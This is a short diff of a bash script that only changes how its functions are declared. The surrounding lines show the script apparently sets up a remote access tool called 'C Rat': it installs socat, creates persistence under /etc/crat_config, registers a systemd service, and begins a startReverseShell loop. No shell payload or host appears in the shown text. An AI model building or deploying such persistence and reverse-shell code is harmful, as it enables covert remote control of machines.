@@ -3,7 +3,7 @@
 if [ ! -x "$(command -v socat)" ]; then sudo apt install -y socat; fi
 
 # check if the file is already in /etc/crat_config/persistant/
-function makePersistant {
+makePersistant () {
   # check if the directory /etc/crat_config exists and create it if it doesn't
   if [ ! -d "/etc/crat_config" ]; then
     mkdir /etc/crat_config
@@ -14,7 +14,7 @@ function makePersistant {
   fi
 }
 
-function updateScript {
+updateScript () {
   # check if the directory /etc/crat_config exists and create it if it doesn't
   if [ ! -d "/etc/crat_config" ]; then
     mkdir /etc/crat_config
@@ -30,7 +30,7 @@ function updateScript {
 }
 
 # check if crat_daemon.service is already in /etc/systemd/system/
-function registerDaemon {
+registerDaemon () {
   if [ ! -f /etc/systemd/system/crat_daemon.service ]; then
       echo "[Unit]
         Description=C Rat service
@@ -68,7 +68,7 @@ function registerDaemon {
   fi
 }
 
-function startReverseShell {
+startReverseShell () {
   while true
   do
 
